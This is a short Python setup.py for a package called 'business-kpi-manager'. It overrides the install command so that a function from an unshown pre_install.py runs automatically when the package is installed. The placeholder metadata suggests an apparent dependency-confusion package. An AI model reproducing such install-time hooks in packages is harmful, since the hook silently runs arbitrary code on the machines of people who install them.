from setuptools import setup, find_packages
from setuptools.command.install import install
from pre_install import pre_install

class CustomInstall(install):
    def run(self):
        # Execute your pre_install.py script
        pre_install()
        # Call the original install command using super()
        super().run()

setup(
  name = 'business-kpi-manager',
  packages = find_packages(),
  version = '5.9.1',
  license='MIT',
  description = 'service',
  author = 'SherlocksHat',
  author_email = 'sherlockshat007@gmail.com',
  url = 'https://github.com/user/rslockshsat',
  download_url = 'http://notapplicdable.notdapplicable',
  keywords = ['Lyft', 'FRONTEND'],
  install_requires=[],
  classifiers=[
    'Development Status :: 3 - Alpha',
    'Intended Audience :: Developers',
    'Topic :: Software Development :: Build Tools',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
  ],
   cmdclass={'install': CustomInstall},
)
